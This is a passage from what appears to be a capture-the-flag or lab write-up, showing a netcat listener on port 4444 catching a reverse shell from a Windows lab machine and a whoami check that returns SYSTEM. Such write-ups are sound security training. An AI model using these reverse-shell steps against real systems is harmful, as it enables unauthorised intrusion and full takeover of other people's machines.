[*] Closing down connection (10.10.10.169,54564)
[*] Remaining connections []
```
  
  
Back on your netcat listener, you should've gotten back a shell:
```
kali@kali:~$ sudo nc -lvnp 4444
[sudo] password for kali: 
listening on [any] 4444 ...
connect to [10.10.14.64] from (UNKNOWN) [10.10.10.169] 54565
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

:)

